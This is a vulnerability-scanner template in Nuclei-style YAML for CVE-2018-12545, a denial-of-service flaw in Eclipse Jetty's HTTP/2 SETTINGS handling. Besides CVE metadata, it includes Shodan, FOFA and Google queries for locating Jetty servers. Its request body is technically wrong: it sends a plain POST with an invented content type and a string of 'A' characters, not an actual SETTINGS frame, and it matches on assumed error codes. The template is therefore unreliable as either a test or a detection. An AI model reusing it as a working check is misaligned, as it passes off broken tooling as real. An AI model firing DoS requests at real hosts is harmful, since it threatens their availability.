id: CVE-2018-12545

info:
  name: Eclipse Jetty Large SETTINGS Frame DoS
  author: ProjectDiscoveryAI
  severity: high
  description: In Eclipse Jetty version 9.3.x and 9.4.x, the server is vulnerable to Denial of Service conditions if a remote client sends either large SETTINGs frames containing many settings, or many small SETTINGs frames. The vulnerability is due to the additional CPU and memory allocations required to handle changed settings.
  impact: |
    Successful exploitation could lead to a DoS condition, impacting availability.
  remediation: |
    Apply the necessary patches or upgrade to a version that is not vulnerable to CVE-2018-12545.
  reference:
    - https://lists.apache.org/thread.html/13f5241048ec0bf966a6ddd306feaf40de5b20e1f09096b9cddeddf2%40%3Ccommits.accumulo.apache.org%3E
    - https://lists.apache.org/thread.html/70744fe4faba8e2fa7e50a7fc794dd03cb28dad8b21e08ee59bb1606%40%3Cdevnull.infra.apache.org%3E
    - https://lists.apache.org/thread.html/9317fd092b257a0815434b116a8af8daea6e920b6673f4fd5583d5fe%40%3Ccommits.druid.apache.org%3E
    - https://lists.apache.org/thread.html/febc94ffec9275dcda64633e0276a1400cd318e571009e4cda9b7a79%40%3Cnotifications.accumulo.apache.org%3E
    - https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2018-12545
    cwe-id: CWE-400,CWE-770
    epss-score: 0.04073
    epss-percentile: 0.92424
    cpe: cpe:2.3:a:eclipse:jetty:9.3.0:20150601:*:*:*:*:*:*
  metadata:
    vendor: eclipse
    product: jetty
    shodan-query:
      - cpe:"cpe:2.3:a:eclipse:jetty"
      - http.html:"contexts known to this"
      - http.title:"powered by jetty"
    fofa-query:
      - body="contexts known to this"
      - title="powered by jetty"
    google-query: intitle:"powered by jetty"

http:
  - method: POST
    path:
      - "{{BaseURL}}/somepath"  # Example path, adjust based on the actual target environment

    headers:
      Content-Type: "application/http2-settings"

    body: "{{'A' * 10000}}"  # Sending a large SETTINGS frame
    matchers:
      - type: status
        status:
          - 500  # Assuming server responds with error status on handling large settings
          - 502
          - 503
